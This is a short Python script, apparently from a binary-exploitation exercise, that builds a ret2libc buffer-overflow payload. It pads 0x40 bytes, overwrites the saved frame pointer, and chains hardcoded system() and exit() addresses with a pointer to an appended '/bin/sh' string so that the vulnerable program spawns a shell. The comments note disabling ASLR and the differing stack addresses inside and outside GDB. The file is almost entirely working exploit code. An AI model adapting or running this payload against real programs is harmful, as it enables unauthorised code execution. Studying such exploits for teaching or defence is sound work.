import sys
# Make sure aslr is disabled, even though nothing seemed wrong in gdb
# Why doesn't it work with gets?

system_addr = "\xa0\xfd\xe2\xf7"
exit_addr = "\xd0\x39\xe2\xf7"
fake_retaddr = "DDDD"
# In GDB
sh_str_addr = "\xfc\xcb\xff\xff" # end of our entire string
# Standalone
#sh_str_addr = "\x3c\xcc\xff\xff" # end of our entire string
sh_str = "/bin/sh"

exploit = "A"*0x40 # padding
exploit += "BBBB" # overwrite ebp
exploit += system_addr
exploit += exit_addr # the 'junk' return addr for system
exploit += sh_str_addr # BOTH arg to system call and junk ret addr for exit

exploit += "\x40\x01\x01\x01" # this will be arg for exit call (can't have nulls?)
exploit += sh_str
print(exploit)

